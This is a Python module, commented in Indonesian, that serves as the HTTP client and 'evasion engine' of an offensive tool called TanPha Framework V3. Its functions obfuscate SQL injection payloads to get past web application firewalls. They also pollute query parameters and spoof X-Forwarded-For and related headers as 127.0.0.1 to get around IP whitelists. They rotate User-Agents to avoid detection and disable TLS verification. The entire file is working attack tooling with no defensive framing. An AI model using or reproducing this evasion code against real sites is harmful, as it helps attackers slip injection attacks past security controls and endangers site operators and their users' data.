"""Centralized HTTP Client & Evasion Engine untuk TanPha Framework V3."""
import time
import re
import random
import requests

GLOBAL_CONFIG = {
    "proxy": None,
    "delay": 0.0,
    "max_retries": 3,
    "evasion": True,
    "hpp": True,      # Fitur baru: HTTP Parameter Pollution
    "h_spoof": True   # Fitur baru: Advanced Header Spoofing
}

# Daftar User-Agent buat muter-muter biar nggak dicurigai
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1"
]

def obfuscate_payload(payload, dbms="Unknown"):
    """Fungsi Logika WAF Bypass (Obfuscation)."""
    if not GLOBAL_CONFIG["evasion"] or not payload:
        return payload

    trailing = ""
    m = re.search(r'(--(?:\s.*)?$|#.*$)', payload)
    core = payload
    if m:
        trailing = m.group(0)
        core = payload[:m.start()]

    # 1. Ganti spasi jadi komentar
    core = re.sub(r'\s+', '/**/', core)

    # 2. Case Randomization
    def _mix_case(match):
        word = match.group(0)
        return ''.join(c.upper() if random.choice([True, False]) else c.lower() for c in word)
    core = re.sub(r'\b(SELECT|UNION|AND|OR|FROM|WHERE|NULL|SLEEP|EXEC|WAITFOR|CONCAT)\b', _mix_case, core, flags=re.IGNORECASE)

    # 3. Inline Comment MySQL
    if dbms in ("MySQL", "MariaDB"):
        core = re.sub(r'\bUNION\b', '/*!50000UNION*/', core, flags=re.IGNORECASE)
        core = re.sub(r'\bSELECT\b', '/*!50000SELECT*/', core, flags=re.IGNORECASE)

    return core + trailing

def _inject_hpp(url):
    """Fitur V3: HTTP Parameter Pollution (duplikasi parameter)."""
    if not GLOBAL_CONFIG["hpp"] or "?" not in url:
        return url
    
    # Ambil parameter terakhir, duplikasi
    base, qs = url.split("?", 1)
    if "&" not in qs: return url
    
    params = qs.split("&")
    last_param = params[-1]
    # Duplikasi parameter terakhir (misal: id=1' jadi id=1'&id=1')
    return url + "&" + last_param

def _get_spoof_headers():
    """Fitur V3: Advanced Header Spoofing (Bypass IP Whitelist WAF)."""
    if not GLOBAL_CONFIG["h_spoof"]:
        return {}
    return {
        "X-Forwarded-For": "127.0.0.1",
        "X-Originating-IP": "127.0.0.1",
        "X-Remote-IP": "127.0.0.1",
        "X-Remote-Addr": "127.0.0.1",
        "X-Client-IP": "127.0.0.1",
        "Forwarded": "for=127.0.0.1"
    }

def smart_request(method, url, **kwargs):
    """Pengganti requests.request dengan fitur Evasion V3."""
    
    if GLOBAL_CONFIG["proxy"]:
        kwargs.setdefault("proxies", {"http": GLOBAL_CONFIG["proxy"], "https": GLOBAL_CONFIG["proxy"]})

    kwargs.setdefault("verify", False)
    kwargs.setdefault("timeout", 10)

    # 1. Inject HPP ke URL (kalau GET)
    if method.upper() == "GET":
        url = _inject_hpp(url)

    # 2. Manipulasi Header
    headers = kwargs.get("headers", {})
    # Ganti User-Agent random tiap request
    headers["User-Agent"] = random.choice(USER_AGENTS)
    # Tambahin header spoofing IP
    headers.update(_get_spoof_headers())
    kwargs["headers"] = headers

    # 3. Delay (Rate Limiting)
    if GLOBAL_CONFIG["delay"] > 0:
        time.sleep(GLOBAL_CONFIG["delay"])

    # 4. Eksekusi dengan Retry (429 Handler)
    retries = 0
    while retries < GLOBAL_CONFIG["max_retries"]:
        try:
            response = requests.request(method, url, **kwargs)
            
            if response.status_code == 429:
                retries += 1
                print(f"\n[!] 429 Too Many Requests! (Retry {retries}/{GLOBAL_CONFIG['max_retries']})")
                time.sleep(5)
                continue
                
            return response
            
        except requests.exceptions.RequestException as e:
            print(f"\n[-] Request Error: {e}")
            retries += 1
            time.sleep(2)
            
    return None
